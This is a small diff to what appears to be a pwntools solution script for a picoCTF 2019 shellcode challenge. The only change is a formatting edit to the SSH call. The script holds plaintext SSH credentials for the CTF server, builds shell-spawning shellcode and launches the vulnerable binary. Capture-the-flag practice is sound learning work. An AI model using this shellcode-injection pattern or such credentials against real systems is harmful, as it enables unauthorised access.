@@ -1,5 +1,5 @@
 from pwn import *
-s=ssh(host="2019shell1.picoctf.com",user="cse331",password="3curityishard")
+s=ssh(host="2019shell1.picoctf.com", user="cse331", password="3curityishard")
 s.set_working_directory(wd=b"/problems/handy-shellcode_2_6ad1f834bdcf9fcfb41200ca8d0f55a6")
 shellcode = asm(shellcraft.sh())
 p = s.process("./vuln")
